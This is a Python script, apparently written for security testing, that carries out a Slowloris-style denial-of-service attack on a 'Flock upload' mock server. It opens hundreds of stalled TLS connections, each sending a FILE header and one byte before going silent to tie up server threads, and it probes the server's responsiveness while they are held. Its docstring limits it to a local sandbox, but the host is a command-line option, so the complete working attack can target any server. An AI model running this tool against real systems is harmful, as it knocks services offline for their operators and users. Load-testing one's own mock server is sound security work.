#!/usr/bin/env python3
"""Slowloris-style thread/connection-exhaustion attack against the Flock upload mock.

Distinct from upload_client.py --fuzz's "giant declared length" case: this NEVER declares
an oversized length (so it never touches the known unchecked-length allocation path).
Instead it opens many concurrent connections, sends a legitimately-small FILE header
(opcode 6 + 8-byte big-endian length, e.g. 1000), and then sends nothing further —
exploiting the server's one-thread-per-connection model with no per-socket recv timeout,
so each connection's handler thread blocks forever in `conn.recv()` waiting for a body
that never arrives.

SANDBOX ONLY — point this only at your own local mock (upload_server.py) on localhost.

Usage:
  python3 slowloris_attack.py --port 8443 --connections 400 --hold 25
  python3 slowloris_attack.py --port 8443 --connections 400 --hold 25 --canary
"""
import argparse, socket, ssl, struct, sys, threading, time

OK, HELLO, PROTO, SESSION, START, FILE, HASH, SAVE, COMPLETE, METADATA = 1, 2, 3, 4, 5, 6, 7, 8, 9, 12


def be_long(n):
    return struct.pack(">q", n)


def open_stalled_connection(host, port, tls, declared_len, results, idx, connect_timeout):
    """Open one connection, send FILE opcode + a small declared length, then send
    nothing else. Returns the live socket (kept open by caller) or records failure."""
    try:
        s = socket.create_connection((host, port), timeout=connect_timeout)
        if tls:
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        # Minimal slowloris payload: just the opcode + length header, no HELLO needed —
        # the mock server dispatches on opcode with no state-machine enforcement.
        s.sendall(bytes([FILE]))
        s.sendall(be_long(declared_len))
        # send ONE byte of the body then stall forever (never a full body, never a giant length)
        s.sendall(b"\x00")
        s.settimeout(None)  # we're not going to read; we just hold the socket open
        results[idx] = ("ok", s)
    except Exception as e:
        results[idx] = (f"{type(e).__name__}: {e}", None)


def canary_upload(host, port, tls, timeout):
    """A tiny legitimate-looking request used to probe whether the server can still
    accept + service new connections while under the slowloris load."""
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        data = b"\x00" * 16
        meta = b'{"canary":true}'
        s.sendall(bytes([METADATA])); s.sendall(be_long(len(meta))); s.sendall(meta)
        resp = s.recv(1)
        s.sendall(bytes([FILE])); s.sendall(be_long(len(data))); s.sendall(data)
        resp2 = s.recv(1)
        s.close()
        return True, time.time() - t0, f"resp={resp!r} resp2={resp2!r}"
    except Exception as e:
        return False, time.time() - t0, f"{type(e).__name__}: {e}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--plaintext", action="store_true")
    ap.add_argument("--connections", type=int, default=400, help="number of stalled connections to open")
    ap.add_argument("--declared-len", type=int, default=1000, help="small, legitimate-looking FILE length")
    ap.add_argument("--hold", type=float, default=20.0, help="seconds to hold connections open before releasing")
    ap.add_argument("--connect-timeout", type=float, default=5.0)
    ap.add_argument("--canary", action="store_true", help="probe server responsiveness during the hold")
    a = ap.parse_args()
    tls = not a.plaintext

    n = a.connections
    results = [None] * n
    threads = []
    t_start = time.time()
    print(f"[attack] opening {n} stalled connections to {a.host}:{a.port} "
          f"(FILE length={a.declared_len}, 1 body byte sent, then silence)...", flush=True)
    for i in range(n):
        th = threading.Thread(target=open_stalled_connection,
                               args=(a.host, a.port, tls, a.declared_len, results, i, a.connect_timeout))
        th.start()
        threads.append(th)
        if i % 50 == 0:
            time.sleep(0.02)  # gentle ramp so we can see the failure point, if any
    for th in threads:
        th.join(timeout=a.connect_timeout + 2)

    ok = [r for r in results if r and r[0] == "ok"]
    fail = [r for r in results if not r or r[0] != "ok"]
    print(f"[attack] opened {len(ok)}/{n} stalled connections in {time.time()-t_start:.1f}s; "
          f"{len(fail)} failed to open", flush=True)
    if fail:
        # show the first few distinct failure reasons (e.g. EMFILE, connection refused)
        seen = {}
        for r in fail:
            reason = r[0] if r else "no-attempt"
            seen[reason] = seen.get(reason, 0) + 1
        for reason, cnt in list(seen.items())[:10]:
            print(f"[attack]   failure x{cnt}: {reason}", flush=True)

    if a.canary:
        print(f"[canary] probing server responsiveness while {len(ok)} connections are held open...", flush=True)
        okc, dt, info = canary_upload(a.host, a.port, tls, timeout=8.0)
        print(f"[canary] success={okc} elapsed={dt:.2f}s detail={info}", flush=True)

    print(f"[attack] holding {len(ok)} connections open for {a.hold}s ...", flush=True)
    time.sleep(a.hold)

    if a.canary:
        print(f"[canary] second probe after hold period...", flush=True)
        okc, dt, info = canary_upload(a.host, a.port, tls, timeout=8.0)
        print(f"[canary] success={okc} elapsed={dt:.2f}s detail={info}", flush=True)

    print("[attack] releasing all held connections", flush=True)
    for r in ok:
        try:
            r[1].close()
        except Exception:
            pass
    print("[attack] done", flush=True)


if __name__ == "__main__":
    main()
